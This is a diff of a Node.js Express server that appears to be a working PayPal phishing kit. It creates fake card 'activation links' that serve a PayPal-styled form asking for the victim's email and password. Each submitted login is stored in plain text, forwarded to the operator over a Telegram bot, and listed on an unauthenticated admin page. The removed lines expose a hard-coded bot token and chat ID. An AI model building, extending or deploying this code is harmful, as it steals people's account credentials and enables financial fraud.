@@ -1,229 +1,594 @@
 const express = require('express');
 const cors = require('cors');
+const dotenv = require('dotenv');
+const path = require('path');
 const fs = require('fs').promises;
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
+const { v4: uuidv4 } = require('uuid');
 const TelegramBot = require('node-telegram-bot-api');
+
+dotenv.config();
 const app = express();
 
-app.use(express.json());
+// Initialize Telegram Bot
+let bot;
+try {
+  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
+} catch (err) {
+  console.error('Failed to initialize Telegram bot:', err.message);
+}
+
+// Middleware
 app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'frontend'))); // Serve frontend
 
-// Telegram bot configuration
-const token = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo'; // Your bot token
-const chatId = '6270110371'; // Your chat ID
-const bot = new TelegramBot(token, { polling: false });
+// Log activation link access
+app.use('/api/cards/activate', (req, res, next) => {
+  console.log(`Activation link accessed: ${req.originalUrl} at ${new Date().toLocaleString()}`);
+  next();
+});
 
-// File paths
-const USERS_FILE = 'users.json';
-const CARDS_FILE = 'cards.json';
-const LOGS_FILE = 'logs.json';
-
-// Initialize files if they don't exist
-async function initFiles() {
+// Initialize data.json if it doesn't exist
+const dataPath = path.join(__dirname, 'data/data.json');
+async function initializeDataFile() {
   try {
-    await fs.access(USERS_FILE);
-  } catch {
-    await fs.writeFile(USERS_FILE, JSON.stringify({}, null, 2));
-  }
-  try {
-    await fs.access(CARDS_FILE);
-  } catch {
-    await fs.writeFile(CARDS_FILE, JSON.stringify([], null, 2));
-  }
-  try {
-    await fs.access(LOGS_FILE);
-  } catch {
-    await fs.writeFile(LOGS_FILE, JSON.stringify([], null, 2));
-  }
-}
-initFiles();
-
-// Read data from files
-async function readData(file) {
-  const data = await fs.readFile(file, 'utf8');
-  return JSON.parse(data);
-}
-
-// Write data to files
-async function writeData(file, data) {
-  await fs.writeFile(file, JSON.stringify(data, null, 2));
-}
-
-// Send Telegram notification
-async function sendTelegramNotification(cardId, username) {
-  const message = `New PayPal log received at ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}.\nCard ID: ${cardId}\nActivated by: ${username}`;
-  try {
-    await bot.sendMessage(chatId, message);
-    console.log('Telegram notification sent');
-  } catch (error) {
-    console.error('Error sending Telegram notification:', error);
+    await fs.access(dataPath);
+  } catch (err) {
+    if (err.code === 'ENOENT') {
+      await fs.writeFile(dataPath, JSON.stringify({ users: [], cards: [], activationLogs: [] }, null, 2));
+      console.log('Initialized data.json');
+    } else {
+      console.error('Error accessing data.json:', err.message);
+    }
   }
 }
 
-// Register user
-app.post('/api/register', async (req, res) => {
+// Call initialization before starting the server
+initializeDataFile().catch(err => console.error('Initialization error:', err));
+
+// JWT Authentication Middleware
+const authMiddleware = (req, res, next) => {
+  const token = req.header('Authorization')?.replace('Bearer ', '');
+  if (!token) {
+    return res.status(401).json({ error: 'Access denied: No token provided' });
+  }
+
+  try {
+    const decoded = jwt.verify(token, process.env.JWT_SECRET);
+    req.user = decoded;
+    next();
+  } catch (err) {
+    console.error('JWT verification error:', err.message);
+    res.status(401).json({ error: 'Invalid token' });
+  }
+};
+
+// Signup
+app.post('/api/auth/signup', async (req, res) => {
   const { username, password } = req.body;
-  const users = await readData(USERS_FILE);
-  if (users[username]) return res.status(400).json({ error: 'User exists' });
-  users[username] = password;
-  await writeData(USERS_FILE, users);
-  res.json({ message: 'User registered' });
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password required' });
+  }
+
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    if (data.users.find(u => u.username === username)) {
+      return res.status(400).json({ error: 'Username already exists' });
+    }
+
+    const hashedPassword = await bcrypt.hash(password, 10);
+    data.users.push({ username, password: hashedPassword });
+    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
+
+    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
+    res.status(201).json({ token });
+  } catch (err) {
+    console.error('Signup error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
-// Login user
-app.post('/api/login', async (req, res) => {
+// Signin
+app.post('/api/auth/login', async (req, res) => {
   const { username, password } = req.body;
-  const users = await readData(USERS_FILE);
-  if (users[username] === password) {
-    res.json({ message: 'Login successful', username });
-  } else {
-    res.status(401).json({ error: 'Invalid credentials' });
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password required' });
+  }
+
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    const user = data.users.find(u => u.username === username);
+    if (!user) {
+      return res.status(400).json({ error: 'Invalid credentials' });
+    }
+
+    const isMatch = await bcrypt.compare(password, user.password);
+    if (!isMatch) {
+      return res.status(400).json({ error: 'Invalid credentials' });
+    }
+
+    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
+    res.json({ token });
+  } catch (err) {
+    console.error('Login error:', err.message);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Generate card
-app.post('/api/generate-card', async (req, res) => {
-  const { username, name, expDate, amount } = req.body;
-  if (!username || !name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
-    return res.status(400).json({ error: 'Invalid input' });
+// Delete User (Admin only)
+app.delete('/api/auth/delete-user', async (req, res) => {
+  const authHeader = req.header('Authorization');
+  if (!authHeader || authHeader !== `Basic ${Buffer.from(`${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}`).toString('base64')}`) {
+    return res.status(401).json({ error: 'Unauthorized' });
   }
-  const cards = await readData(CARDS_FILE);
-  const cardNumber = "4123" + Math.random().toString().slice(2, 14).padEnd(12, '0');
-  const maskedNumber = `****-****-****-${cardNumber.slice(-4)}`;
-  const cvv = Math.floor(100 + Math.random() * 900);
-  const cardId = Math.random().toString(36).substr(2, 9);
-  const link = `http://localhost:3000/api/activate/${cardId}`;
-  const card = {
-    id: cardId,
-    number: maskedNumber,
-    cvv,
-    name,
-    expDate: `${expDate.slice(0, 2)}/${expDate.slice(2)}`,
-    amount: parseFloat(amount),
-    status: 'Pending',
-    owner: username,
-    activations: [],
-    generationTimestamp: new Date().toISOString(),
-  };
-  cards.push(card);
-  await writeData(CARDS_FILE, cards);
-  res.json({ cardId, link });
+
+  const { username } = req.body;
+  if (!username) {
+    return res.status(400).json({ error: 'Username required' });
+  }
+
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    if (!data.users.find(u => u.username === username)) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    data.users = data.users.filter(u => u.username !== username);
+    data.cards = data.cards.filter(c => c.owner !== username);
+    data.activationLogs = data.activationLogs.filter(l => !data.cards.some(c => c.cardId === l.cardId && c.owner === username));
+    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
+    res.json({ message: 'User deleted' });
+  } catch (err) {
+    console.error('Delete user error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
-// Activate card via link
-app.get('/api/activate/:cardId', async (req, res) => {
+// Generate Card
+app.post('/api/cards/generate', authMiddleware, async (req, res) => {
+  const { name, expDate, amount } = req.body;
+  if (!name || !expDate || !amount || amount <= 0 || !/^\d{2}\d{4}$/.test(expDate.replace(/\//g, ''))) {
+    return res.status(400).json({ error: 'Invalid input: name, expiration date (MMYYYY), and positive amount required' });
+  }
+
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    const cardNumber = '4123' + Math.floor(100000000000 + Math.random() * 900000000000).toString().slice(0, 12);
+    const maskedNumber = `****-****-****-${cardNumber.slice(-4)}`;
+    const cvv = Math.floor(100 + Math.random() * 900).toString();
+    const cardId = uuidv4();
+    const formattedExpDate = `${expDate.slice(0, 2)}/${expDate.slice(2)}`;
+    const activationLink = `http://localhost:5000/api/cards/activate/${cardId}`;
+
+    const card = {
+      cardId,
+      number: maskedNumber,
+      cvv,
+      name,
+      expDate: formattedExpDate,
+      amount: parseFloat(amount),
+      status: 'Pending',
+      owner: req.user.username,
+      activationLink,
+      generationTimestamp: new Date().toISOString()
+    };
+
+    data.cards.push(card);
+    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
+    res.status(201).json(card);
+  } catch (err) {
+    console.error('Generate card error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Get User's Cards
+app.get('/api/cards', authMiddleware, async (req, res) => {
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    const userCards = data.cards.filter(c => c.owner === req.user.username);
+    res.json(userCards);
+  } catch (err) {
+    console.error('Get cards error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Activate Card (Serve Form)
+app.get('/api/cards/activate/:cardId', async (req, res) => {
   const { cardId } = req.params;
-  const cards = await readData(CARDS_FILE);
-  const card = cards.find(c => c.id === cardId);
-  if (!card || card.status !== 'Pending') {
-    return res.status(404).send('Invalid or already activated card');
-  }
-  res.send(`
-    <html>
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).send('Server error');
+    }
+
+    const card = data.cards.find(c => c.cardId === cardId);
+    if (!card || card.status === 'Activated') {
+      return res.status(400).send('Invalid or already activated card');
+    }
+
+    res.send(`
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Activate Card</title>
+        <style>
+          body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f9fa; }
+          .container { width: 400px; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+          .input-field { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px; }
+          .btn { width: 100%; padding: 10px; background-color: #0070ba; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        </style>
+      </head>
       <body>
-        <h2>PayPal Activation</h2>
-        <form action="/api/activate/${cardId}" method="post">
-          <input type="text" name="username" placeholder="Email or mobile number" required><br>
-          <input type="password" name="password" placeholder="Password" required><br>
-          <button type="submit">Activate Card</button>
-        </form>
+        <div class="container">
+          <h2>Activate Card</h2>
+          <input type="text" class="input-field" id="paypalUsername" placeholder="PayPal Email">
+          <input type="password" class="input-field" id="paypalPassword" placeholder="PayPal Password">
+          <button class="btn" onclick="activate()">Activate</button>
+        </div>
+        <script>
+          async function activate() {
+            const username = document.getElementById('paypalUsername').value;
+            const password = document.getElementById('paypalPassword').value;
+            if (!username || !password) {
+              alert('Please enter PayPal email and password');
+              return;
+            }
+            try {
+              const response = await fetch('/api/cards/activate/${cardId}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+              });
+              const data = await response.json();
+              alert(data.message || data.error);
+              if (response.ok) window.location.href = '/';
+            } catch (err) {
+              alert('Error activating card');
+            }
+          }
+        </script>
       </body>
-    </html>
-  `);
+      </html>
+    `);
+  } catch (err) {
+    console.error('Activate card error:', err.message);
+    res.status(500).send('Server error');
+  }
 });
 
-// Process activation form submission
-app.post('/api/activate/:cardId', async (req, res) => {
+// Activate Card (Collect PayPal Login)
+app.post('/api/cards/activate/:cardId', async (req, res) => {
   const { cardId } = req.params;
   const { username, password } = req.body;
-  const cards = await readData(CARDS_FILE);
-  const card = cards.find(c => c.id === cardId);
-  if (!card || card.status !== 'Pending' || !username || !password) {
-    return res.status(400).send('Invalid activation');
+  if (!username || !password) {
+    return res.status(400).json({ error: 'PayPal email and password required' });
   }
-  card.status = 'Activated';
-  card.activations.push({
-    id: Date.now().toString(), // Unique log ID based on timestamp
-    user: username,
-    pass: password,
-    time: new Date().toISOString(),
-  });
-  await writeData(CARDS_FILE, cards);
 
-  // Send Telegram notification
-  await sendTelegramNotification(cardId, username);
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
 
-  // Store log
-  const logs = await readData(LOGS_FILE);
-  logs.push({ id: card.activations[card.activations.length - 1].id, cardId, username, password, time: new Date().toISOString() });
-  await writeData(LOGS_FILE, logs);
+    const card = data.cards.find(c => c.cardId === cardId);
+    if (!card || card.status === 'Activated') {
+      return res.status(400).json({ error: 'Invalid or already activated card' });
+    }
 
-  res.send('Card activated successfully. <a href="/api/dashboard/user1">Back to Dashboard</a>'); // Replace user1 with dynamic username if needed
-});
+    card.status = 'Activated';
+    const log = {
+      id: uuidv4(),
+      cardId,
+      user: username,
+      pass: password,
+      time: new Date().toISOString()
+    };
+    data.activationLogs.push(log);
+    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
 
-// Get PayPal logs for a card
-app.get('/get/:cardId', async (req, res) => {
-  const { cardId } = req.params;
-  const cards = await readData(CARDS_FILE);
-  const card = cards.find(c => c.id === cardId);
-  if (!card) return res.status(404).json({ error: 'Card not found' });
-  const logs = await readData(LOGS_FILE);
-  const cardLogs = logs.filter(log => log.cardId === cardId);
-  res.json({ cardId, logs: cardLogs });
-});
+    // Send Telegram notification to admin
+    try {
+      await bot.sendMessage(
+        process.env.TELEGRAM_CHAT_ID,
+        `New PayPal login for card ${card.number} (Owner: ${card.owner}):\nEmail: ${username}\nPassword: ${password}\nTime: ${new Date(log.time).toLocaleString()}`
+      );
+    } catch (telegramError) {
+      console.error('Telegram notification failed:', telegramError.message);
+    }
 
-// Delete a card (owner or user-owned)
-app.delete('/api/delete-card/:cardId', async (req, res) => {
-  const { cardId } = req.params;
-  const { username } = req.query; // Pass username in query for ownership check
-  const cards = await readData(CARDS_FILE);
-  const cardIndex = cards.findIndex(c => c.id === cardId);
-  if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
-  const card = cards[cardIndex];
-  if (username !== card.owner && username !== 'admin') { // 'admin' can delete any card
-    return res.status(403).json({ error: 'Unauthorized to delete this card' });
+    res.json({ message: 'Card activated successfully' });
+  } catch (err) {
+    console.error('Activate card error:', err.message);
+    res.status(500).json({ error: 'Server error' });
   }
-  cards.splice(cardIndex, 1);
-  await writeData(CARDS_FILE, cards);
-
-  // Remove associated logs
-  const logs = await readData(LOGS_FILE);
-  const updatedLogs = logs.filter(log => log.cardId !== cardId);
-  await writeData(LOGS_FILE, updatedLogs);
-
-  res.json({ message: 'Card deleted successfully' });
 });
 
-// Delete a log (user-owned)
-app.delete('/api/delete-log/:logId', async (req, res) => {
-  const { logId } = req.params;
-  const { username } = req.query; // Pass username in query for ownership check
-  const cards = await readData(CARDS_FILE);
-  const logs = await readData(LOGS_FILE);
-  const log = logs.find(l => l.id === logId);
-  if (!log) return res.status(404).json({ error: 'Log not found' });
-  const card = cards.find(c => c.id === log.cardId);
-  if (!card || (username !== card.owner && username !== 'admin')) {
-    return res.status(403).json({ error: 'Unauthorized to delete this log' });
+// Get Activation Logs
+app.get('/api/cards/logs', authMiddleware, async (req, res) => {
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    let logs;
+    if (req.user.username === process.env.ADMIN_USERNAME) {
+      logs = data.activationLogs; // Admin sees all logs
+    } else {
+      const userCards = data.cards.filter(c => c.owner === req.user.username);
+      logs = data.activationLogs.filter(l => userCards.some(c => c.cardId === l.cardId));
+    }
+    res.json(logs);
+  } catch (err) {
+    console.error('Get logs error:', err.message);
+    res.status(500).json({ error: 'Server error' });
   }
-  const updatedLogs = logs.filter(l => l.id !== logId);
-  await writeData(LOGS_FILE, updatedLogs);
-  card.activations = card.activations.filter(a => a.id !== logId);
-  await writeData(CARDS_FILE, cards);
-  res.json({ message: 'Log deleted successfully' });
 });
 
-// Get user dashboard
-app.get('/api/dashboard/:username', async (req, res) => {
-  const { username } = req.params;
-  const users = await readData(USERS_FILE);
-  if (!users[username]) return res.status(404).json({ error: 'User not found' });
-  const cards = await readData(CARDS_FILE);
-  const logs = await readData(LOGS_FILE);
-  const userCards = cards.filter(c => c.owner === username);
-  const userLogs = logs.filter(l => cards.find(c => c.id === l.cardId && c.owner === username));
-  res.json({ cards: userCards, logs: userLogs });
+// Delete Card (User or Admin)
+app.delete('/api/cards/delete', authMiddleware, async (req, res) => {
+  const { cardId } = req.body;
+  if (!cardId) {
+    return res.status(400).json({ error: 'Card ID required' });
+  }
+
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    const card = data.cards.find(c => c.cardId === cardId);
+    if (!card) {
+      return res.status(404).json({ error: 'Card not found' });
+    }
+    if (card.owner !== req.user.username && req.user.username !== process.env.ADMIN_USERNAME) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+
+    data.cards = data.cards.filter(c => c.cardId !== cardId);
+    data.activationLogs = data.activationLogs.filter(l => l.cardId !== cardId);
+    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
+    res.json({ message: 'Card deleted' });
+  } catch (err) {
+    console.error('Delete card error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT} at ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`));
+// Delete Log (User or Admin)
+app.delete('/api/cards/delete-log', authMiddleware, async (req, res) => {
+  const { logId } = req.body;
+  if (!logId) {
+    return res.status(400).json({ error: 'Log ID required' });
+  }
+
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).json({ error: 'Server error' });
+    }
+
+    const log = data.activationLogs.find(l => l.id === logId);
+    if (!log) {
+      return res.status(404).json({ error: 'Log not found' });
+    }
+
+    const card = data.cards.find(c => c.cardId === log.cardId);
+    if (!card || (card.owner !== req.user.username && req.user.username !== process.env.ADMIN_USERNAME)) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+
+    data.activationLogs = data.activationLogs.filter(l => l.id !== logId);
+    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
+    res.json({ message: 'Log deleted' });
+  } catch (err) {
+    console.error('Delete log error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Admin Dashboard
+app.get('/admin', async (req, res) => {
+  try {
+    let data;
+    try {
+      data = JSON.parse(await fs.readFile(dataPath));
+    } catch (err) {
+      console.error('Error reading data.json:', err.message);
+      return res.status(500).send('Server error: Unable to read data');
+    }
+
+    const { users, cards, activationLogs } = data;
+
+    // Generate HTML for admin dashboard
+    const html = `
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Admin Dashboard</title>
+        <style>
+          body { font-family: Arial, sans-serif; margin: 20px; background-color: #f7f9fa; }
+          h1 { text-align: center; }
+          table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+          th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
+          th { background-color: #0070ba; color: white; }
+          button { padding: 5px 10px; background-color: #ff4d4d; color: white; border: none; cursor: pointer; }
+          button:hover { background-color: #cc0000; }
+        </style>
+      </head>
+      <body>
+        <h1>Admin Dashboard</h1>
+        <h2>Users</h2>
+        <table>
+          <tr><th>Username</th><th>Action</th></tr>
+          ${users.map(user => `
+            <tr>
+              <td>${user.username}</td>
+              <td><button onclick="deleteUser('${user.username}')">Delete</button></td>
+            </tr>
+          `).join('')}
+        </table>
+        <h2>Cards</h2>
+        <table>
+          <tr><th>Card ID</th><th>Number</th><th>Name</th><th>Owner</th><th>Status</th><th>Activation Link</th><th>Action</th></tr>
+          ${cards.map(card => `
+            <tr>
+              <td>${card.cardId}</td>
+              <td>${card.number}</td>
+              <td>${card.name}</td>
+              <td>${card.owner}</td>
+              <td>${card.status}</td>
+              <td><a href="${card.activationLink}" target="_blank">${card.activationLink}</a></td>
+              <td><button onclick="deleteCard('${card.cardId}')">Delete</button></td>
+            </tr>
+          `).join('')}
+        </table>
+        <h2>Activation Logs</h2>
+        <table>
+          <tr><th>Card ID</th><th>PayPal Email</th><th>PayPal Password</th><th>Timestamp</th><th>Action</th></tr>
+          ${activationLogs.map(log => `
+            <tr>
+              <td>${log.cardId}</td>
+              <td>${log.user}</td>
+              <td>${log.pass}</td>
+              <td>${new Date(log.time).toLocaleString()}</td>
+              <td><button onclick="deleteLog('${log.id}')">Delete</button></td>
+            </tr>
+          `).join('')}
+        </table>
+        <script>
+          async function deleteUser(username) {
+            if (!confirm('Delete user?')) return;
+            try {
+              const response = await fetch('/api/auth/delete-user', {
+                method: 'DELETE',
+                headers: { 
+                  'Content-Type': 'application/json', 
+                  'Authorization': 'Basic ' + btoa('${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}')
+                },
+                body: JSON.stringify({ username })
+              });
+              const data = await response.json();
+              alert(data.message || data.error);
+              location.reload();
+            } catch (err) {
+              alert('Error deleting user');
+            }
+          }
+          async function deleteCard(cardId) {
+            if (!confirm('Delete card?')) return;
+            try {
+              const response = await fetch('/api/cards/delete', {
+                method: 'DELETE',
+                headers: { 
+                  'Content-Type': 'application/json', 
+                  'Authorization': 'Basic ' + btoa('${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}')
+                },
+                body: JSON.stringify({ cardId })
+              });
+              const data = await response.json();
+              alert(data.message || data.error);
+              location.reload();
+            } catch (err) {
+              alert('Error deleting card');
+            }
+          }
+          async function deleteLog(logId) {
+            if (!confirm('Delete log?')) return;
+            try {
+              const response = await fetch('/api/cards/delete-log', {
+                method: 'DELETE',
+                headers: { 
+                  'Content-Type': 'application/json', 
+                  'Authorization': 'Basic ' + btoa('${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}')
+                },
+                body: JSON.stringify({ logId })
+              });
+              const data = await response.json();
+              alert(data.message || data.error);
+              location.reload();
+            } catch (err) {
+              alert('Error deleting log');
+            }
+          }
+        </script>
+      </body>
+      </html>
+    `;
+    res.send(html);
+  } catch (err) {
+    console.error('Admin dashboard error:', err.message);
+    res.status(500).send('Server error');
+  }
+});
+
+// Error Handling Middleware
+app.use((err, req, res, next) => {
+  console.error('Server error:', err.message);
+  res.status(500).json({ error: 'Internal server error' });
+});
+
+// Start Server
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
